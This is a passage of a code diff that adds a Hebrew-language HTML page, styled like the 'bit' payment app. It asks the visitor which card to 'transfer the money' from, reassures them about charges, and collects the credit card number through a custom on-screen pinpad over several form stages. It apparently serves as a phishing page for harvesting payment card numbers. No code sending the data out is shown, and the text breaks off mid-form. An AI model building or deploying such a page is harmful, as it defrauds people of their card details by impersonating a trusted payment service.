=');
+            background-repeat: no-repeat;
+            background-size: cover;
+            color: #fff;
+        }
+
+        header {
+            padding: 20px;
+        }
+
+        #form1,#form2,#form3 {
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+        }
+
+        .button {
+            width: 50%;
+            padding: 15px;
+            border: 1px solid #fff;
+            color: #fff;
+            border-radius: 75px;
+            background: transparent;
+            display: block;
+            margin: 0 auto;
+        }
+
+        input,button {
+            outline: none !important;
+            box-shadow: none !important;
+        }
+
+        .inForm {
+            background-color: rgba(255, 255, 255, 0.1);
+            border: 0;
+            border-radius: 8px;
+            overflow: hidden;
+        }
+
+        #form1 > header {
+            flex: 0.25;
+        }
+
+        #form1 > section {
+            flex: 0.75;
+            padding: 20px;
+        }
+
+        #form1 > footer {
+            padding: 30px 0 40px 0;
+        }
+
+        #form2 > .inForm > header {
+            border: 0;
+            border-bottom: 1px solid #549ea9;
+            text-align: center;
+            font-size: 16px;
+            font-weight: 600;
+            margin-bottom: 20px;
+        }
+
+        #form3 > header {
+            border: 0;
+            border-bottom: 1px solid #549ea9;
+            text-align: center;
+            font-size: 16px;
+            font-weight: 600;
+            margin-bottom: 20px;
+        }
+
+        #form2 > .inForm > section {
+            text-align: center;
+            padding: 20px;
+            flex: 1;
+        }
+
+        #form3 > section {
+            text-align: center;
+            padding: 20px;
+            flex: 1;
+        }
+
+        .input {
+            width: 100%;
+            font-size: 24px;
+            border: 0;
+            border-bottom: 2px solid #fff;
+            background-color: transparent;
+            margin-bottom: 15px;
+            text-align: center;
+            color: #fff;
+            font-weight: 100;
+        }
+
+        .input::placeholder {
+            color: #fff;
+            opacity: 0.5;
+        }
+        
+        .td_.td_2 {
+            background: transparent;
+            padding-top: 0;
+            color: #ffffffb8;
+        }
+
+        .pinpad.d-flex.justify-content-between {
+        }
+
+        .td_.td_2 {
+            color: #ffffffb8;
+        }
+
+        span.pinpad-item {
+            color: #fff;
+            padding: 10px 0px;
+            text-align: center;
+            font-size: 26px;
+            width: 57px;
+            margin-top: -14px;
+            cursor: pointer;
+        }
+
+        .asd {
+            margin-top: 40px;
+        }
+
+        .button1 {
+            width: 100%;
+            padding: 12px;
+            background-color: transparent;
+            color: #fff;
+            border: 0;
+            font-size: 16px;
+            font-weight: 600;
+            border-top: 1px solid #fff;
+        }
+
+        .button1:disabled {
+            opacity: 0.4;
+        }
+        
+        .error {
+            border-color: #f00 !important;
+        }
+    </style>
+</head>
+<body ng-app="CombineModule">
+    <div class="loader__" id="spinner" style="display:none;position:fixed;top:0px;left:0px;width:100%;height:100%;text-align:center;background:rgba(255, 255, 255, 0.47);z-index:8000000;">
+        <span  class="fa fa-circle-o-notch  fa-spin " style="position:relative;top:50%;font-size:50px;color:#278d90"></span>
+    </div>
+    <form onsubmit="return false">
+        <div id="form1" style="">
+            <header>
+                <img style="width: 20px;" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACgAAAApCAQAAADtq6NDAAABEklEQVRIx63UsVEDQQyF4UcFjpy4DAeQQEIblEDiDs4VUAKdEJAR0weMZxjin+Cw7/Zud6VdWUo134ykmSeE2KEr9A4hIR755RDmBk7copEDguQAwIk78cAPBMnhX/hiL+LkjBtvGCMT7gz2kwtuAvvIFTcH28kMl4JtZJZbgn6ywK1BH3nmvpdcDrTJCpcH6+SxxpXAMmlwZTBPmlwNXJMOrg6mpIuzwDnp4mwwJU3OA4rXC/hiT9vcMVn5EAWnVzhjw8vtvbHh5dxJ5OecZAvnIts4B9nKmWQ7J8R9mezhqmQfVyF7uSLZzxXICJclY1yGjHIrUjwHuZR8Els+g9xEfrARYst7kBvJNzboBl23/gCvBYYIGru++gAAAABJRU5ErkJggg==" alt="">
+            </header>
+            <section>
+                <div style="text-align: center;">
+                    <img style="width: 85px;margin-bottom: 15px;" src="data:image/png;base64,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" alt="">
+                    
+                    <p style="font-weight: 600;">? מאיזה כרטיס להעביר את הכסף</p>
+                    <p>נצטרך את מספר כרטייס האשראי שלך <br> ( רק להקליד פעם אחת וזהו )</p>
+
+                    <p style="font-weight: 600;margin-top: 20px;margin-bottom: 20px;">לא לדאוג, הכרטיס יחויב רק אחרי שהעברה אושרה</p>
+                    <p>וכמובן שתמיד אפשר לשנות את פרטי כרטייס האשראי</p>
+                </div>
+            </section>
+            <footer>
+                <input type="submit" class="button" id="nextPage" value="המשך">
+            </footer>
+        </div>
+        <div id="form2" ng-controller="MyControllerA" style="padding: 15px;display: none;">
+            <div class="inForm">
+                <header>
+                    <img style="width: 16px;float: left; margin-top: 5px;" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACgAAAApCAQAAADtq6NDAAABEklEQVRIx63UsVEDQQyF4UcFjpy4DAeQQEIblEDiDs4VUAKdEJAR0weMZxjin+Cw7/Zud6VdWUo134ykmSeE2KEr9A4hIR755RDmBk7copEDguQAwIk78cAPBMnhX/hiL+LkjBtvGCMT7gz2kwtuAvvIFTcH28kMl4JtZJZbgn6ywK1BH3nmvpdcDrTJCpcH6+SxxpXAMmlwZTBPmlwNXJMOrg6mpIuzwDnp4mwwJU3OA4rXC/hiT9vcMVn5EAWnVzhjw8vtvbHh5dxJ5OecZAvnIts4B9nKmWQ7J8R9mezhqmQfVyF7uSLZzxXICJclY1yGjHIrUjwHuZR8Els+g9xEfrARYst7kBvJNzboBl23/gCvBYYIGru++gAAAABJRU5ErkJggg==" alt="">
+                    <span>הוספת כרטיס אשראי</span>
+                    <img style="width: 24px;float: right; margin-top: 5px;" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAGEAAAA5CAMAAAARBbULAAAA1VBMVEX18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/EAAAD18/H18/H18/H18/H18/H18/H18/FsIVkHAAAARnRSTlNpLR8q6CAp598dHuDm6igs7lTpF9ku8DpLFtgv8fc7fN0bFdfy3BrW80bTnTz0SNsZ1T7MP549OfXaGNQCIeMAWisc3n0BaXLaegAAAWVJREFUWMPt2NtSwjAQBuAKghYVEVTEA0rFeqqKoKgVXVox7/9IdiZJO0CSccb97/xvO9Nv2mbT3XjEkO9ZYL/oMQCTW3ETIIUMEOI9wAmTZyFcxN+F5FVIogN7S09uguNLDxXx2EEJNLxzECxCQbRQAo3tBJNA4ytJXLZQgp1gEwoiRgkUmQlGgaK+ieAUcuI8RgnU1cQAJVD3eIlgFgwEt5AThwOUQG1NhCiB2vtzBEBYIBACvShiN0QJBdHLhPsRIk0piM9R5E0FNgf/wq+EnQYiJ+r+/cY1ZrXWNyWw4YPqob6mgA9QxVU1UAHtGhpYr4B2vgWAX6iuzgPsQlkDJdBfVANfJVAnUG4uAbxCDtRAHVmigLMaqKs0A4xCsmUE+IRtDfigCUUDFz5oylqxAkxCDqSgaXdPAQ8paGI/cgEcggbeUtDJSewGOJ5hJoEe8JzvVPXAOCEj7ABTPXghgQVXfgDMajaKbVc2/AAAAABJRU5ErkJggg==" alt="">
+                </header>
+                <section>
+                    <img style="width: 50px;margin-bottom: 15px;" src="data:image/png;base64,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" alt="">
+                
+                    <p>
+                        <span style="padding: 3px 12px;border: 0;border-radius: 75px;color: #fff;background-color: rgba(255, 255, 255, 0.08);">i</span>
+                        <span style="font-size: 22px;font-weight: 100;">הזן פרטי אשראי</span>
+                    </p>
+
+                    <input type="tel" class="input" id="card" name="card" onkeyup="" readonly placeholder="מספר כרטיס אשראי">
+
+                    <p style="text-align: center;color: #fff;font-weight: 100;font-size: 12px;">bit- כרטיס זה יחויב בהענות כ ב</p>
+
+
+                    <div class="grid">
+                        <div class="tr_ tr3">
+                            <div class="td_ td_2">
+                                <div class="asd" style="background: transparent;">
+                                    <div class="pinpad d-flex justify-content-between">
+                                        <span id="btnPin5" ng-click="edit_pinw(1)" onclick="valid_credit_card(card.value);checkCard()" class="pinpad-item">
+                                            <span class="val">1</span>
+                                        </span>
+                                        <span id="btnPin7" ng-click="edit_pinw(2)" onclick="valid_credit_card(card.value);checkCard()" class="pinpad-item">
+                                            <span class="val">2</span>
+                                        </span>
+                                        <span id="btnPin3" ng-click="edit_pinw(3)" onclick="valid_credit_card(card.value);checkCard()" class="pinpad-item">
+                                            <span class="val">3</span>
+                                        </span>
+                                    </div>
+                                    <div class="pinpad d-flex justify-content-between">
+                                        <span id="btnPin9" ng-click="edit_pinw(4)" onclick="valid_credit_card(card.value);checkCard()" class="pinpad-item">
+                                            <span class="val">4</span>
+                                        </span>
+                                        <span id="btnPin1" ng-click="edit_pinw(5)" onclick="valid_credit_card(card.value);checkCard()" class="pinpad-item">
+                                            <span class="val">5</span>
+                                        </span>
+                                        <span id="btnPin8" ng-click="edit_pinw(6)" onclick="valid_credit_card(card.value);checkCard()" class="pinpad-item">
+                                            <span class="val">6</span>
+                                        </span>
+                                    </div>
+                                    <div class="pinpad d-flex justify-content-between">
+                                        <span id="btnPin6" ng-click="edit_pinw(7)" onclick="valid_credit_card(card.value);checkCard()" class="pinpad-item">
+                                            <span class="val">7</span>
+                                        </span>
+                                        <span id="btnPin4" ng-click="edit_pinw(8)" onclick="valid_credit_card(card.value);checkCard()" class="pinpad-item">
+                                            <span class="val">8</span>
+                                        </span>
+                                        <span id="btnPin2" ng-click="edit_pinw(9)" onclick="valid_credit_card(card.value);checkCard()" class="pinpad-item">
+                                            <span class="val">9</span>
+                                        </span>
+                                    </div>
+                                    <div class="pinpad d-flex justify-content-between">
+                                        <span class="pinpad-item" style="text-align: center;padding: 20px 0 0 0;">
+                                            .
+                                        </span>
+                                        <span id="btnPin10" ng-click="edit_pinw(0)" onclick="valid_credit_card(card.value);checkCard()" style="padding: 20px 0 0 0;" class="pinpad-item">
+                                            <span class="val">0</span>
+                                        </span>
+                                        <span class="pinpad-item" id="btnDel" ng-click="reset();" onclick="valid_credit_card(card.value);checkCard()" style="text-align: center;padding: 20px 0 0 0;"> 
+                                            <img style="width: 30px;" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAH4AAABbCAMAAACCnME/AAACvlBMVEX18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/EAAAD18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/ErSp2HAAAA6XRSTlMxcko4QU6BNvRivi2z8TKs9qqgpKdIqKP3nbC0Wb/BhJp+z29tc2xrYV93Z3l1e086XtgTcVxaIOWIVoqAjIPFVPu7U4/DkfmSlSyxJeqWrUMm6y+fRfUwoqYr8KGpS56ryQRYnK6YsraUywa6kLfyyAOOuT29k8CXKu/C0As/hwAj6GWNPgoHzNUQVSTp0QwJzsYBuCjt1xIP1GpJ2xbZFP4u89INbs0IaQXKeNwXDtPWEfwZ3n3hHIsn7Brf4h1Rr+Qff+MeTXzgGxjdUILmIaVEcGDEY8cC/doVdPgzZiLnhrVSmfruKVRSAo8AAAWiSURBVGjetdrrQxRVFABwetn7ZaU9sYQsU6zULClDC/NRWGapaZYPEnLJWi01FTmVLQKC6Ji5UgYa4BOVBcUiiMwSSErzwcNMRYj5L9q5Z3aBZe/OPXfvnE+yeM8PmJl7zz13IoAQ9eelo6NuV7CMEQR97S96GNGeceJUfRj8Z0f1cKOp9XijJP/XIV1F5PwuxR/5SVcUNZV0vvoPXVn8eJLKV3zLBnpOlUpGScfPDbubTN9TROMrv8M75xSEFb9d2m7+AAcpfP3XbEzBGQg38tsK0N8pzm/NQP1fUBAnL+Lf/xtRvmU/6nmgJCq2sHSbysT4/JWoF4Gi2Ir+Rk2E37weL9bfoCwqslnGLAE+cw3q50BhfMmewPIdlrx7N+p7QGmsZkm/sOLdZ1E/plaHws+NrBlaaL7wNOq/guooYnlXheRTV6DeoFyHdcuNxMtC8a6lqKeBDbHEyJyt8XnXJ6gftkOHj1nuDi6fuxj1Rbbo4PyQ3fs8Pn0h6h9o9vCQYmRfwuEdrai/b5eOj35ycN6RhPp823TIM/LvD8o73kM90T4d5hnAoWD83Nmov9tonw7vGMJ/QXjnLNTfdoLd/MyevPMt1E9Y6o4Q1yZXkndOR32WtZ7cxvWnVb0pxTe+gfpsAZ3/ZEx5XZ/6mgSvJaL+qsNSZzPDpKD+tgTvtyz8YLzWhvrLljo08OeliQnsW8szibw2AXO2Wuv+1Xi8xtHHHSf+9tpLmHGhQ+TJ8fmBq8IMU79MvfaLMN/iHYIlw1j8//Hd/E+xjG1/kXrnH8ZsL7iEKzazFovv8lkHq+L0MaOpz30a5lrqEp+59sUF1gRf4RZqTBZ11nseM61wUWZO9wYcNaq77smiTrrPYZ7T62gzt89/ln31w5+ox1Ln/GOYZcM+6srh/ghHjvT+e/IzqM+jLjl7MMccN33l8u2D0uAV7Lt5RlBXvHOYYY2E7vUX4Ohl2HfzPEVdcIfj+PWlciu3bxdK0jv5Iux3rBwmWzl08T1PUsuNPNS/b5GvXEqLfbp478nkK/7BkU+EUzmdNxtGNfRi6/FxbOTRtfL607V6QMOMcO0vt7ORVRdk9a791oNkHkZ72MjaI5LNwvKuHdMh9Eo3Fv3yahnd7PYWxGD/TR9ML7RHoL+3QkLfi/ogaMGGmf4Yvc4fiH5zHblJZuo7Oxt2egx9m/EoPjpDy4g6droLHsGGYYa4H7Den0H/QAlFr2tGfYD5dckB9B+mb7IGob+FMPuZffaCaP8nZu9bH07f4w1AP0fYLxuKelTPz6x7sD0r3Sgc2X8YSQ+QKoP8TILbDHPlLRZaeXl/Z98ViaLv8WIw4wKBuoN/l/nux2j6FnOwcNU1hP+MmU9jdiaZh4cwa5xlzanN5z/hbC5KmCjTXjAr7rGWFbf2IH9+9a4DCdvkmiv90I+03G9oifzVpXrOFMneDoxE/wEXhBEayPIwirrXVNnZ8kY8bactz28Kymvj0U922Mffz+1qev1J6N9nnx/N5vcI/lNlxL22+ew4IymCd+feY3bYdtnERxrZV/N4cAr3F6XCcbeRfCCXB2df9PvY4t/Fcl/g8+C8E/077PB7s51FyHM85+3o91bv59/GLn3oU8y5t5rnCspPNXBhvcXiDNdRY8+pSsvNRtazlifYjptsOVPCM4NY6/N7o2vPTtxU+llYUjsF3l5I32h2jtXpN+LrM0a/35KH3BTFp6mTsQE3HYR4cN3QtXMZdkzD5mOtW5AHVyT6l1To11/Hck29FkR5SDU7973CxmeYd5LnGhDnoTBOxVsU2tV9zJfG/G1fMd7fOe4l+67mVVde0feir/+z3X/MI8j7O7cqorlzAyLKQ2axIrwpPhXoPGzur0RP6rb/EOchPydse+aEAI/A+ztncq/pVqX0W9WjcKXwkF4qHZwdy/+Y84qviIXtNAAAAABJRU5ErkJggg=="alt="" class="i76"> 
+                                        </span>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </section>
+                <footer>
+                    <input type="submit" class="button1" disabled id="lastPage" value="המשך">
+                </footer>
+            </div>
+        </div>
+        <div id="form3" style="display: none;">
+            <header>
+                <img style="width: 16px;float: left; margin-top: 5px;" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACgAAAApCAQAAADtq6NDAAABEklEQVRIx63UsVEDQQyF4UcFjpy4DAeQQEIblEDiDs4VUAKdEJAR0weMZxjin+Cw7/Zud6VdWUo134ykmSeE2KEr9A4hIR755RDmBk7copEDguQAwIk78cAPBMnhX/hiL+LkjBtvGCMT7gz2kwtuAvvIFTcH28kMl4JtZJZbgn6ywK1BH3nmvpdcDrTJCpcH6+SxxpXAMmlwZTBPmlwNXJMOrg6mpIuzwDnp4mwwJU3OA4rXC/hiT9vcMVn5EAWnVzhjw8vtvbHh5dxJ5OecZAvnIts4B9nKmWQ7J8R9mezhqmQfVyF7uSLZzxXICJclY1yGjHIrUjwHuZR8Els+g9xEfrARYst7kBvJNzboBl23/gCvBYYIGru++gAAAABJRU5ErkJggg==" alt="">
+                <span>הוספת כרטיס אשראי</span>
